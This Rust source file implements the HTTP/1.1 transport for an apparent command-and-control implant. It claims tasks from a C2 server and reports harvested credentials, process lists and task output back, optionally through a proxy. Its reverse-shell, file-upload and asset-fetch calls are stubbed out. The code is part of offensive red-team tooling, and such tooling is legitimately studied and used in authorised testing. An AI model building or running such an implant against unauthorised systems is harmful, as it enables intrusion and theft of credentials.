use crate::transport::Transport;
use anyhow::Result;
use hyper::{
    client::connect::{Connect, HttpConnector},
    Client, Uri,
};
use pb::c2::*;
use prost::Message;
use std::str::FromStr;
use std::sync::{
    mpsc::{Receiver, Sender},
    Arc,
};
use tokio::sync::mpsc::{Receiver as TokioReceiver, Sender as TokioSender};
use tokio_rustls::rustls;

// ClientEnum is used to abstract over the two different types of hyper clients
// that we need to support: one for direct HTTPS connections, and one for
// proxied connections. This is necessary because the `Transport` trait
// requires the `Http1` struct to be `Clone`, and we cannot use a trait object
// for the hyper client's connector which would lead to two different client types.
#[derive(Clone)]
enum ClientEnum {
    Direct(Client<hyper_rustls::HttpsConnector<HttpConnector>>),
    Proxied(Client<hyper_proxy::ProxyConnector<HttpConnector>>),
}

#[derive(Clone)]
pub struct Http1 {
    base_uri: Uri,
    client: ClientEnum,
}

impl Transport for Http1 {
    fn init() -> Self {
        let https = hyper_rustls::HttpsConnectorBuilder::new()
            .with_native_roots()
            .https_or_http()
            .enable_http1()
            .build();
        let client = Client::builder().build(https);
        Http1 {
            base_uri: Uri::from_static("http://localhost"),
            client: ClientEnum::Direct(client),
        }
    }

    fn new(uri: String, proxy_uri: Option<String>) -> Result<Self> {
        let base_uri = Uri::from_str(&uri)?;

        let client = if let Some(proxy_uri_string) = proxy_uri {
            let mut http = HttpConnector::new();
            http.enforce_http(false);

            let proxy_uri = Uri::from_str(&proxy_uri_string)?;
            let proxy = hyper_proxy::Proxy::new(hyper_proxy::Intercept::All, proxy_uri);
            let mut connector = hyper_proxy::ProxyConnector::from_proxy(http, proxy)?;

            // When using a proxy, we need to create a `tokio_rustls::TlsConnector`
            // to handle TLS connections through the proxy. The versions of `rustls`
            // and `webpki-roots` are pinned in `Cargo.toml` to be compatible with
            // the versions used by `hyper-proxy` and `hyper-rustls`.
            let mut config = rustls::ClientConfig::new();
            config
                .root_store
                .add_server_trust_anchors(&webpki_roots::TLS_SERVER_ROOTS);

            let tls_connector = tokio_rustls::TlsConnector::from(Arc::new(config));
            connector.set_tls(Some(tls_connector));

            let client = Client::builder().build(connector);
            ClientEnum::Proxied(client)
        } else {
            let https = hyper_rustls::HttpsConnectorBuilder::new()
                .with_native_roots()
                .https_or_http()
                .enable_http1()
                .build();
            let client = Client::builder().build(https);
            ClientEnum::Direct(client)
        };

        Ok(Http1 { base_uri, client })
    }

    async fn claim_tasks(&mut self, request: ClaimTasksRequest) -> Result<ClaimTasksResponse> {
        let uri = self.uri_for("/c2.C2/ClaimTasks")?;
        match &mut self.client {
            ClientEnum::Direct(c) => unary_request(c, uri, request).await,
            ClientEnum::Proxied(c) => unary_request(c, uri, request).await,
        }
    }

    /// NOTE: Server-side streaming is not implemented for HTTP/1.1.
    async fn fetch_asset(
        &mut self,
        _request: FetchAssetRequest,
        _sender: Sender<FetchAssetResponse>,
    ) -> Result<()> {
        log::error!("fetch_asset is not implemented for http1 transport");
        unimplemented!("fetch_asset is not implemented for http1 transport")
    }

    async fn report_credential(
        &mut self,
        request: ReportCredentialRequest,
    ) -> Result<ReportCredentialResponse> {
        let uri = self.uri_for("/c2.C2/ReportCredential")?;
        match &mut self.client {
            ClientEnum::Direct(c) => unary_request(c, uri, request).await,
            ClientEnum::Proxied(c) => unary_request(c, uri, request).await,
        }
    }

    /// NOTE: Client-side streaming is not implemented for HTTP/1.1.
    async fn report_file(
        &mut self,
        _request: Receiver<ReportFileRequest>,
    ) -> Result<ReportFileResponse> {
        log::error!("report_file is not implemented for http1 transport");
        unimplemented!("report_file is not implemented for http1 transport")
    }

    async fn report_process_list(
        &mut self,
        request: ReportProcessListRequest,
    ) -> Result<ReportProcessListResponse> {
        let uri = self.uri_for("/c2.C2/ReportProcessList")?;
        match &mut self.client {
            ClientEnum::Direct(c) => unary_request(c, uri, request).await,
            ClientEnum::Proxied(c) => unary_request(c, uri, request).await,
        }
    }

    async fn report_task_output(
        &mut self,
        request: ReportTaskOutputRequest,
    ) -> Result<ReportTaskOutputResponse> {
        let uri = self.uri_for("/c2.C2/ReportTaskOutput")?;
        match &mut self.client {
            ClientEnum::Direct(c) => unary_request(c, uri, request).await,
            ClientEnum::Proxied(c) => unary_request(c, uri, request).await,
        }
    }

    /// NOTE: Bidirectional streaming is not implemented for HTTP/1.1.
    async fn reverse_shell(
        &mut self,
        _rx: TokioReceiver<ReverseShellRequest>,
        _tx: TokioSender<ReverseShellResponse>,
    ) -> Result<()> {
        log::error!("reverse_shell is not implemented for http1 transport");
        unimplemented!("reverse_shell is not implemented for http1 transport")
    }
}

impl Http1 {
    fn uri_for(&self, path: &str) -> Result<Uri> {
        let mut parts = self.base_uri.clone().into_parts();
        let path_and_query = Some(hyper::http::uri::PathAndQuery::from_str(path)?);
        parts.path_and_query = path_and_query;
        Ok(Uri::from_parts(parts)?)
    }
}

/// Helper function to handle unary gRPC requests over HTTP/1.1.
/// It takes a generic hyper client, a URI, and a protobuf request message.
/// It sends the request as a POST with the serialized protobuf message as the body.
/// It expects a protobuf message in the response body.
async fn unary_request<C, T, R>(client: &Client<C>, uri: Uri, request: T) -> Result<R>
where
    C: Connect + Clone + Send + Sync + 'static,
    T: Message,
    R: Message + Default,
{
    let body = request.encode_to_vec();
    let req = hyper::Request::builder()
        .method(hyper::Method::POST)
        .uri(uri)
        .header(hyper::header::CONTENT_TYPE, "application/octet-stream")
        .body(hyper::Body::from(body))?;

    let resp = client.request(req).await?;

    if !resp.status().is_success() {
        return Err(anyhow::anyhow!(
            "Request failed with status: {}",
            resp.status()
        ));
    }

    let body = hyper::body::to_bytes(resp.into_body()).await?;
    let response = R::decode(&body[..])?;
    Ok(response)
}
